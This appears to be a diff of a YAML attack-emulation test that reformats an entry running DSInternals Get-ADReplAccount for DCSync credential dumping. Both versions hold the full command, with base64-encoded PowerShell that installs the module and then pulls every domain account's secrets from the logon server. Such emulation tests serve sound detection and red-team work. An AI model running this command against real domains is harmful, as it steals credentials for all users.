@@ -1,16 +1,15 @@
-- id: 2e33b076-7b82-54db-9f26-4c79c725f65c
+- requirements: []
   name: Soumaia ART Tests - Run DSInternals Get-ADReplAccount
   description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/"
   tactic: credential-access
-  technique:
-    attack_id: T1003.006
-    name: 'OS Credential Dumping: DCSync'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand JABSAGUAcQB1AGkAcgBlAGQATQBvAGQAdQBsAGUAIAA9ACAARwBlAHQALQBNAG8AZAB1AGwAZQAgAC0ATgBhAG0AZQAgAEQAUwBJAG4AdABlAHIAbgBhAGwAcwAgAC0ATABpAHMAdABBAHYAYQBpAGwAYQBiAGwAZQAKAGkAZgAgACgALQBuAG8AdAAgACQAUgBlAHEAdQBpAHIAZQBkAE0AbwBkAHUAbABlACkAIAB7AGUAeABpAHQAIAAxAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMAB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand SQBuAHMAdABhAGwAbAAtAE0AbwBkAHUAbABlACAALQBOAGEAbQBlACAARABTAEkAbgB0AGUAcgBuAGEAbABzACAALQBTAGMAbwBwAGUAIABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAAtAEYAbwByAGMAZQAKAA==
-          }
-          Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")
+  technique_id: T1003.006
+  technique_name: 'OS Credential Dumping: DCSync'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand JABSAGUAcQB1AGkAcgBlAGQATQBvAGQAdQBsAGUAIAA9ACAARwBlAHQALQBNAG8AZAB1AGwAZQAgAC0ATgBhAG0AZQAgAEQAUwBJAG4AdABlAHIAbgBhAGwAcwAgAC0ATABpAHMAdABBAHYAYQBpAGwAYQBiAGwAZQAKAGkAZgAgACgALQBuAG8AdAAgACQAUgBlAHEAdQBpAHIAZQBkAE0AbwBkAHUAbABlACkAIAB7AGUAeABpAHQAIAAxAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMAB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand SQBuAHMAdABhAGwAbAAtAE0AbwBkAHUAbABlACAALQBOAGEAbQBlACAARABTAEkAbgB0AGUAcgBuAGEAbABzACAALQBTAGMAbwBwAGUAIABDAHUAcgByAGUAbgB0AFUAcwBlAHIAIAAtAEYAbwByAGMAZQAKAA== }; Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")
+  id: 2e33b076-7b82-54db-9f26-4c79c725f65c
